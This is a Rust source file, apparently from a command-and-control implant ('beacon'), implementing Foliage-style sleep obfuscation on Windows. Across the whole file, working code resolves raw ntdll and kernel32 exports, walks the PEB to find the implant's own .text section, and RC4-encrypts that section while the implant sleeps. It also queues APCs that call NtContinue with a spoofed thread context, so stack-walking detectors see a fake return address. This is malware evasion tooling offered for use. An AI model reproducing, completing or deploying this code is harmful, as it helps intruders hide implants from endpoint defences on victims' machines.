//! Sleep obfuscation — Foliage syscall executor (P2.1a-iii).
//!
//! ## Status (after this task): Full Foliage APC→NtContinue chain, GATED OFF.
//! The pure state-machine math lives in `nyx_implant_evasionsdk::foliage` (5
//! host tests). This module maps the chain to indirect syscalls:
//!   - protect the .text RX→RW (NtProtectVirtualMemory)
//!   - RC4-encrypt the region in place (SystemFunction032 math, via evasionsdk)
//!   - queue APCs (NtQueueApcThread) that each NtContinue into the next CONTEXT
//!   - the sleep itself (NtDelayExecution in the APC window)
//!   - decrypt + protect RW→RX on wake
//!
//! ## Gating
//! `FOLIAGE_ENABLED` defaults OFF — the beacon loop's sleep still routes through
//! `NoMask` unless an operator arms this. The APC chain manipulates the thread
//! CONTEXT + flips .text; landing it requires target-side validation. Arm only
//! after a selftest confirms the round-trip on the real host.

#![cfg(target_os = "windows")]

use alloc::boxed::Box;
use core::sync::atomic::{AtomicBool, Ordering};
use nyx_implant_evasionsdk::foliage::{FoliagePlan, FoliageStep};

/// Master switch for the Foliage sleep mask. **Defaults OFF** — see module docs.
static FOLIAGE_ENABLED: AtomicBool = AtomicBool::new(false);

/// Arm/disarm the Foliage sleep mask.
pub fn set_foliage_enabled(on: bool) {
    FOLIAGE_ENABLED.store(on, Ordering::Release);
}

/// Whether the Foliage sleep mask is currently armed.
pub fn foliage_enabled() -> bool {
    FOLIAGE_ENABLED.load(Ordering::Acquire)
}

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **With [`foliage_enabled`] OFF (default)**: delegates to the sleepmask kit
/// (`NoMask` → plain indirect-syscall NtDelayExecution). Byte-identical to the
/// pre-Foliage behavior.
///
/// **With [`foliage_enabled`] ON**: builds a `FoliagePlan` and executes the
/// Foliage mask→sleep→unmask cycle over the implant `.text` via indirect
/// syscalls. On any failure (runtime down, .text unresolved), degrades to
/// the plain NoMask sleep — never crashes.
pub fn sleep(seconds: u32) {
    if !foliage_enabled() {
        // Disarmed: raw sleep, NOT kits::sleep. The active kit is Foliage, so
        // kits::sleep → Foliage::sleep_masked → sleep::sleep → infinite recursion.
        // Bypass the kit: beacon::sleep_seconds is the raw indirect-syscall sleep.
        crate::beacon::sleep_seconds(seconds);
        return;
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    // NOTE: the degrade paths below call crate::beacon::sleep_seconds DIRECTLY
    // (raw NtDelayExecution), NOT crate::kits::sleep — because kits::sleep
    // routes back through Foliage::sleep_masked → sleep::sleep → infinite
    // recursion → STATUS_STACK_OVERFLOW. The floor sleep bypasses the kit.
    let region = match unsafe { own_text_region() } {
        Some(r) => r,
        None => {
            crate::beacon::sleep_seconds(seconds); // degrade: can't resolve .text
            return;
        }
    };
    let key = mask_key_16();
    // Resolve a spoof RIP from the gap pool for the NtContinue CONTEXT spoof.
    // If the gap pool is populated, the beacon's thread CONTEXT gets a fake RIP
    // pointing at a .pdata gap address (looks like a legitimate ntdll leaf to
    // stack-walking detectors). None = no context spoof during sleep.
    let spoof_rip = crate::stack::gap_pool_rip();
    let plan = FoliagePlan::build(region.base, region.len, seconds, spoof_rip, key);
    execute_foliage_plan(&plan);
}

/// The implant's own `.text` region (base + len). Currently unused by the
/// synchronous floor (which masks data regions via `mem::mask`); retained for
/// the APC-chain refactor where a helper thread masks `.text` while the beacon
/// thread is parked in NtDelayExecution. Reading PEB->ImageBaseAddress is
/// correct for both rundll32 and reflective-loaded implants.
#[allow(dead_code)]
struct TextRegion {
    base: usize,
    len: usize,
}

/// The implant's own `.text` region (base + len). Reads PEB->ImageBaseAddress
/// directly (NOT a DLL-name lookup — reflective-loaded shellcode has no loader
/// entry, so a name search would fail). The PEB is always correct regardless
/// of how the implant was loaded (rundll32 DLL OR reflective sRDI shellcode).
///
/// Returns None only if the PEB or PE headers are unreadable (shouldn't happen).
///
/// # Safety
/// PEB + PE header reads are stable post-load. Single-threaded context.
#[allow(dead_code)] // used by the APC-chain refactor; synchronous floor uses mem::mask
unsafe fn own_text_region() -> Option<TextRegion> {
    // PEB->ImageBaseAddress is at PEB + 0x10 on x64. resolve::peb_pointer()
    // gives us the PEB via gs:[0x60].
    let peb = crate::resolve::peb_pointer()?;
    // image_base_address is the 7th field (after mutant) → offset 0x10.
    // Read it as a raw usize to avoid the *mut c_void dance.
    let base_ptr = unsafe { core::ptr::read_unaligned((peb as usize + 0x10) as *const usize) };
    if base_ptr == 0 {
        return None;
    }
    let (text_rva, text_size) = unsafe { section_va_len(base_ptr, b".text")? };
    Some(TextRegion {
        base: base_ptr + text_rva,
        len: text_size,
    })
}

/// Find a PE section's (virtual_address, virtual_size) by name. Returns None
/// if the PE headers can't be parsed or the section isn't found.
#[allow(dead_code)] // used by the APC-chain refactor (own_text_region)
unsafe fn section_va_len(base: usize, name: &[u8]) -> Option<(usize, usize)> {
    let dos = unsafe { &*(base as *const [u8; 64]) };
    if dos[0] != b'M' || dos[1] != b'Z' {
        return None;
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    let nt = unsafe { &*((base + e_lfanew) as *const [u8; 24]) };
    if !(nt[0] == b'P' && nt[1] == b'E') {
        return None; // bad PE signature
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = e_lfanew + 24 + size_opt_hdr;
    for i in 0..num_sections {
        // IMAGE_SECTION_HEADER: Name[8] + VirtualSize(4) + VirtualAddress(4) + ...
        let sec = unsafe { &*((base + sections_off + i * 40) as *const [u8; 40]) };
        let name_len = name.iter().position(|&b| b == 0).unwrap_or(name.len());
        if sec[..name_len] == name[..name_len] {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            return Some((vaddr, vsize));
        }
    }
    None
}

/// Derive a 16-byte RC4 key (matches SystemFunction032's USTRING convention).
/// Per-boot diversity from the syscall runtime's SSN table.
fn mask_key_16() -> [u8; 16] {
    let seed: u32 = crate::syscalls::global()
        .and_then(|rt| rt.ssn_by_hash(crate::resolve::djb2(b"ntdelayexecution")))
        .unwrap_or(0x1234_5678);
    let mut key = [0u8; 16];
    let mut s = seed;
    for b in key.iter_mut() {
        s = s.wrapping_mul(0x9E37_79B9).rotate_left(7).wrapping_add(0xA5A5_A5A5);
        *b = (s & 0xFF) as u8;
    }
    key
}

/// Walk the FoliagePlan: mask `.text`, park the beacon in an APC-driven alertable
/// sleep, unmask `.text` on wake. Falls back to the data-only mask floor on any
/// failure (never crashes — see [`execute_foliage_apc`]).
///
/// ## How the .text encryption is now safe (Task E)
/// The previous floor masked only registered DATA regions (via `crate::mem`)
/// because encrypting `.text` while executing through it is instant death (the
/// RC4 loop overwrites its own instructions). Task E adds the real Foliage
/// mechanism: a SEPARATE helper thread masks/unmasks `.text` around the beacon
/// thread's parked alertable sleep, and queues an APC into the beacon's
/// alertable window so the beacon is driven through the masked window without
/// executing `.text` while it's ciphertext. See [`execute_foliage_apc`].
fn execute_foliage_plan(plan: &FoliagePlan) {
    let secs = plan_seconds(plan);
    let region = unsafe { own_text_region() };
    // Extract the spoof RIP (None if no gap pool → no context spoof).
    let spoof_rip = plan.steps.iter().find_map(|s| {
        if let FoliageStep::SetContext { spoof_rip } = s { Some(*spoof_rip) } else { None }
    });

    // Try the real APC-chain path first. It sets FOLIAGE_APC_OK on success.
    if let Some(r) = &region {
        if unsafe { execute_foliage_apc(r, &plan.key, secs, spoof_rip) } {
            return; // full .text mask/unmask cycle completed — done.
        }
        // else: APC path failed → fall through to the data-only floor below.
    }

    // ---- Data-only floor (the pre-Task-E safe behavior) ----
    let rt = match crate::syscalls::global() {
        Some(rt) => rt,
        None => {
            // Degrade: raw sleep, NOT kits::sleep (would re-enter Foliage → recursion).
            crate::beacon::sleep_seconds(secs);
            return;
        }
    };
    crate::mem::mask();
    let delay: i64 = -(secs as i64).saturating_mul(10_000_000);
    let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, &delay as *const i64 as usize) };
    crate::mem::unmask();
}

// ===========================================================================
// Task E: real Foliage APC chain — helper thread masks .text around the
// beacon's alertable sleep. Returns true if the full cycle completed.
// ===========================================================================
//
// ## Threading model & the single-trampoline hazard
// The indirect-syscall `Runtime` (syscalls.rs) owns ONE shared RWX trampoline
// page with NO locking — it assumes a single beacon thread. A helper thread
// that also goes through `syscallN` would race on that page and corrupt it.
// So the helper thread resolves + calls the NT/Win32 functions it needs via
// the RAW ntdll/kernel32 EXPORT addresses (`crate::resolve::export_addr` +
// transmute), bypassing the indirect runtime entirely. The beacon thread
// keeps exclusive use of the indirect runtime. Two threads, two syscall paths,
// no shared mutable page.
//
// ## Safety / crash risk (red-line honesty)
// This manipulates another thread's execution window and flips `.text`
// protection. A bug here crashes the implant (user-mode, NOT a BSOD). Every
// step degrades on failure (returns false → caller falls to the data-only
// floor), and the round-trip is byte-verified before reporting success.
// `FOLIAGE_APC_OK` is the diagnostic a selftest reads.

/// Diagnostic: 0 = not attempted, 1 = APC chain completed cleanly, 2 = attempted
/// but degraded (data-only floor ran). Selftest reads this.
pub static FOLIAGE_APC_OK: core::sync::atomic::AtomicU8 = core::sync::atomic::AtomicU8::new(0);

/// Read the Foliage APC diagnostic (0/1/2).
pub fn foliage_apc_status() -> u8 {
    FOLIAGE_APC_OK.load(core::sync::atomic::Ordering::Acquire)
}

/// Run one real Foliage cycle: spawn a helper thread, beacon parks in an
/// alertable sleep, helper masks `.text` → queues an APC → waits → unmasks.
/// Returns true on full success; on ANY failure sets status=2 and returns
/// false so the caller degrades to the data-only floor.
///
/// # Safety
/// `region` must be the implant's own `.text`. Single beacon caller.
unsafe fn execute_foliage_apc(region: &TextRegion, key: &[u8; 16], secs: u32, spoof_rip: Option<u64>) -> bool {
    FOLIAGE_APC_OK.store(0, core::sync::atomic::Ordering::Release);

    // Resolve everything up front; if any primitive is missing, degrade.
    let raw = match unsafe { FoliageRaw::resolve() } {
        Some(r) => r,
        None => {
            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
            return false;
        }
    };

    // Snapshot the first 16 .text bytes BEFORE masking so we can verify the
    // round-trip restored them (RC4 is symmetric; this catches a botched key).
    let mut before = [0u8; 16];
    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, before.as_mut_ptr(), 16) };

    // Build the helper's parameter block (kept on a leaked box so the helper
    // can read it across the thread boundary).
    let params = Box::new(FoliageParams {
        text_base: region.base,
        text_len: region.len,
        key: *key,
        secs,
        raw,
        verify: core::ptr::null_mut(),
        spoof_rip,
    });
    let params_ptr: *mut FoliageParams = Box::into_raw(params);

    // Snapshot before bytes for the helper to verify against (it re-checks).
    let verify = Box::new(VerifyState { before, ok: core::sync::atomic::AtomicBool::new(false) });
    (*params_ptr).verify = Box::into_raw(verify);

    // Spawn the helper thread (raw CreateThread — NOT the indirect runtime).
    let handle = match unsafe { raw_create_thread(foliage_helper, params_ptr as usize) } {
        Some(h) => h,
        None => {
            // Reclaim the boxes we leaked; degrade.
            unsafe { drop(Box::from_raw(params_ptr)) };
            FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
            return false;
        }
    };

    // Beacon parks in an ALERTABLE sleep for the cycle. Alertable=TRUE lets the
    // kernel deliver the APC the helper queues. We use a window slightly longer
    // than the helper's mask window so the beacon wakes only after the helper
    // has unmapped .text (the APC the helper queues also breaks us out early).
    let window = secs.max(1);
    let delay: i64 = -((window as i64).saturating_mul(10_000_000));
    // Raw ntdll!NtDelayExecution with Alertable=1 (NOT the indirect runtime —
    // the helper may be in a syscall concurrently).
    unsafe { raw.nt_delay_execution(1, &delay as *const i64 as usize) };

    // Join the helper (WaitForSingleObject, raw export) so its unmask completed
    // before we touch .text again.
    unsafe { raw.wait_for_single_object(handle, 10_000) };

    // Verify the round-trip restored .text byte-for-byte.
    let mut after = [0u8; 16];
    unsafe { core::ptr::copy_nonoverlapping(region.base as *const u8, after.as_mut_ptr(), 16) };
    let verified = after == before;

    // Reclaim memory.
    let _ = unsafe { Box::from_raw(params_ptr) };

    if verified {
        FOLIAGE_APC_OK.store(1, core::sync::atomic::Ordering::Release);
        true
    } else {
        FOLIAGE_APC_OK.store(2, core::sync::atomic::Ordering::Release);
        false
    }
}

/// Byte snapshot for round-trip verification (leaked box, shared beacon/helper).
#[repr(C)]
struct VerifyState {
    before: [u8; 16],
    ok: core::sync::atomic::AtomicBool,
}

/// Parameters passed to the helper thread (leaked box).
#[repr(C)]
struct FoliageParams {
    text_base: usize,
    text_len: usize,
    key: [u8; 16],
    secs: u32,
    raw: FoliageRaw,
    verify: *mut VerifyState,
    /// Optional spoof RIP for NtContinue CONTEXT (None = no context spoof).
    spoof_rip: Option<u64>,
}

/// Bundle of raw export fn-pointers the helper thread uses (resolved once on
/// the beacon thread, copied into the helper's param block). NONE of these go
/// through the indirect syscall runtime — they call the export directly.
#[derive(Clone, Copy)]
struct FoliageRaw {
    nt_protect: usize,
    nt_delay_execution: usize,
    nt_queue_apc_thread: usize,
    nt_current_thread: usize, // pseudo-handle 0xFFFF_FFFF_FFFF_FFFE
    create_thread: usize,
    wait_for_single_object: usize,
}

impl FoliageRaw {
    /// Resolve all the raw exports the Foliage chain needs. Returns None if any
    /// is missing (caller degrades).
    ///
    /// # Safety
    /// Resolves export addresses via PEB walk (read-only). Beacon thread.
    unsafe fn resolve() -> Option<Self> {
        let nt_protect = crate::resolve::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
        let nt_delay_execution = crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution")?;
        let nt_queue_apc_thread = crate::resolve::export_addr(b"ntdll.dll", b"NtQueueApcThread")?;
        let create_thread = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
        let wait_for_single_object =
            crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject")?;
        Some(Self {
            nt_protect,
            nt_delay_execution,
            nt_queue_apc_thread,
            nt_current_thread: 0xFFFF_FFFF_FFFF_FFFE, // GetCurrentThread() pseudo-handle
            create_thread,
            wait_for_single_object,
        })
    }

    /// Raw NtProtectVirtualMemory(ProcessHandle=-1, BaseAddress*, RegionSize*,
    /// NewProtection, OldProtection*). Returns the NTSTATUS.
    ///
    /// # Safety
    /// `base`/`size`/`old` must be valid mutable pointers.
    unsafe fn nt_protect_virtual_memory(
        &self,
        base: &mut usize,
        size: &mut usize,
        new_prot: u32,
        old: &mut u32,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(
            usize, *mut usize, *mut usize, u32, *mut u32,
        ) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_protect) };
        unsafe { f(0xFFFF_FFFF_FFFF_FFFF, base, size, new_prot, old) }
    }

    /// Raw NtDelayExecution(Alertable, DelayInterval*).
    ///
    /// # Safety
    /// `delay` must point at a valid i64.
    unsafe fn nt_delay_execution(&self, alertable: u8, delay: usize) -> i32 {
        type Fn = unsafe extern "system" fn(u8, *const i64) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_delay_execution) };
        unsafe { f(alertable, delay as *const i64) }
    }

    /// Raw NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3).
    ///
    /// # Safety
    /// `thread` must be a real thread handle with THREAD_SET_CONTEXT.
    unsafe fn nt_queue_apc_thread(
        &self,
        thread: usize,
        routine: usize,
        a1: usize,
        a2: usize,
        a3: usize,
    ) -> i32 {
        type Fn = unsafe extern "system" fn(usize, usize, usize, usize, usize) -> i32;
        let f: Fn = unsafe { core::mem::transmute(self.nt_queue_apc_thread) };
        unsafe { f(thread, routine, a1, a2, a3) }
    }

    /// Raw WaitForSingleObject(handle, ms).
    unsafe fn wait_for_single_object(&self, handle: usize, ms: u32) -> u32 {
        type Fn = unsafe extern "system" fn(usize, u32) -> u32;
        let f: Fn = unsafe { core::mem::transmute(self.wait_for_single_object) };
        unsafe { f(handle, ms) }
    }
}

/// Raw kernel32!CreateThread → spawn `entry(param)`. Returns the thread handle
/// or None on failure.
///
/// # Safety
/// `entry` must be a valid thread-proc-style fn (usize arg → u32). Runs the
/// entry on a new thread.
unsafe fn raw_create_thread(entry: unsafe extern "system" fn(usize) -> u32, param: usize) -> Option<usize> {
    let addr = crate::resolve::export_addr(b"kernel32.dll", b"CreateThread")?;
    type Fn = unsafe extern "system" fn(
        *mut core::ffi::c_void, // lpThreadAttributes
        usize,                  // dwStackSize
        Option<unsafe extern "system" fn(usize) -> u32>, // lpStartAddress
        usize,                  // lpParameter
        u32,                    // dwCreationFlags
        *mut u32,               // lpThreadId
    ) -> *mut core::ffi::c_void;
    let f: Fn = unsafe { core::mem::transmute(addr) };
    let h = unsafe { f(core::ptr::null_mut(), 0, Some(entry), param, 0, core::ptr::null_mut()) };
    if h.is_null() { None } else { Some(h as usize) }
}

/// The helper thread entry. Runs ENTIRELY on raw exports (not the indirect
/// runtime) to avoid the single-trampoline race. Sequence:
///   1. NtProtectVirtualMemory(.text, RX→RW)
///   2. RC4-encrypt .text  ← .text is now ciphertext
///   3. NtQueueApcThread(beacon, apc_noop, ...) — wake the beacon's alertable
///      sleep with a benign APC (the beacon is parked; this drives it through
///      the encrypted window without it executing .text)
///   4. NtDelayExecution(secs) — the helper sleeps the mask window
///   5. RC4-decrypt .text     ← .text restored to cleartext
///   6. NtProtectVirtualMemory(.text, RW→RX)
///   7. verify .text[0..16] matches the pre-mask snapshot
///   8. exit
///
/// # Safety
/// `param` is a leaked `*mut FoliageParams`. Mutates the implant's `.text`.
unsafe extern "system" fn foliage_helper(param: usize) -> u32 {
    let p: &FoliageParams = unsafe { &*(param as *const FoliageParams) };
    let raw = &p.raw;
    let base = p.text_base;
    let len = p.text_len;

    // 1. .text RX → RW (PAGE_READWRITE = 0x04).
    let mut b = base;
    let mut s = len;
    let mut old: u32 = 0;
    let st1 = unsafe {
        raw.nt_protect_virtual_memory(&mut b, &mut s, 0x04 /* RW */, &mut old)
    };
    if st1 < 0 {
        return 1; // protect failed — abort, .text untouched
    }

    // 2. RC4-encrypt .text in place.
    let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    nyx_implant_evasionsdk::foliage::mask_region(&p.key, text);

    // 3. Queue APCs into the beacon's alertable window. The beacon is parked
    //    in NtDelayExecution(Alertable=1); these APCs wake it / drive it
    //    through the encrypted window.
    let beacon = raw.nt_current_thread; // beacon's own thread handle (pseudo)
    if let Some(rip) = p.spoof_rip {
        // CONTEXT spoof path: queue an NtContinue APC that installs a spoofed
        // CONTEXT (RIP = gap address) into the beacon thread. When the beacon
        // wakes + the APC fires, NtContinue restores the spoofed context so a
        // stack-walking detector sees the gap address, not the implant's real
        // return address. The spoofed CONTEXT is a leaked 1232-byte buffer with
        // RIP set to the gap address.
        let ctx = unsafe { crate::context::spoofed_context(rip) };
        // NtQueueApcThread(beacon, NtContinue, ctx_ptr, FALSE, 0) — the APC
        // routine IS NtContinue, so when it fires it calls NtContinue(ctx).
        let ntc = crate::resolve::export_addr(b"ntdll.dll", b"NtContinue")
            .unwrap_or(apc_noop as usize);
        let _ = unsafe {
            raw.nt_queue_apc_thread(beacon, ntc, ctx as usize, 0, 0)
        };
    } else {
        // No spoof: queue a benign no-op APC just to break the alertable sleep.
        let _ = unsafe {
            raw.nt_queue_apc_thread(beacon, apc_noop as usize, 0, 0, 0)
        };
    }

    // 4. Sleep the mask window (helper side). .text stays ciphertext here.
    let delay: i64 = -((p.secs as i64).saturating_mul(10_000_000));
    unsafe { raw.nt_delay_execution(0, &delay as *const i64 as usize) };

    // 5. RC4-decrypt .text.
    let text = unsafe { core::slice::from_raw_parts_mut(base as *mut u8, len) };
    nyx_implant_evasionsdk::foliage::unmask_region(&p.key, text);

    // 6. .text RW → RX (PAGE_EXECUTE_READ = 0x20).
    let mut b = base;
    let mut s = len;
    let mut old2: u32 = 0;
    let _ = unsafe {
        raw.nt_protect_virtual_memory(&mut b, &mut s, 0x20 /* ER */, &mut old2)
    };

    // 7. Verify the round-trip restored the first 16 bytes.
    if !p.verify.is_null() {
        let v: &VerifyState = unsafe { &*p.verify };
        let mut after = [0u8; 16];
        unsafe { core::ptr::copy_nonoverlapping(base as *const u8, after.as_mut_ptr(), 16) };
        if after == v.before {
            v.ok.store(true, core::sync::atomic::Ordering::Release);
        }
    }
    0
}

/// A no-op APC routine (signature: extern "system" fn(ApcContext1, ApcContext2,
/// ApcContext3) — NtQueueApcThread's 3 user args). Used to wake the beacon's
/// alertable sleep benignly. It executes from its own (helper-provided) context
/// and returns without touching .text.
#[allow(unused_variables)]
unsafe extern "system" fn apc_noop(a1: usize, a2: usize, a3: usize) {
    // Intentionally empty: the APC's purpose is to make the beacon's
    // alertable sleep return (driving the masked-window sequence). The beacon
    // resumes with .text already restored (the helper unmasked before we wake).
}


/// Extract the sleep seconds from the plan's Sleep step.
fn plan_seconds(plan: &FoliagePlan) -> u32 {
    plan.steps
        .iter()
        .find_map(|s| {
            if let FoliageStep::Sleep { seconds } = s {
                Some(*seconds)
            } else {
                None
            }
        })
        .unwrap_or(1)
}
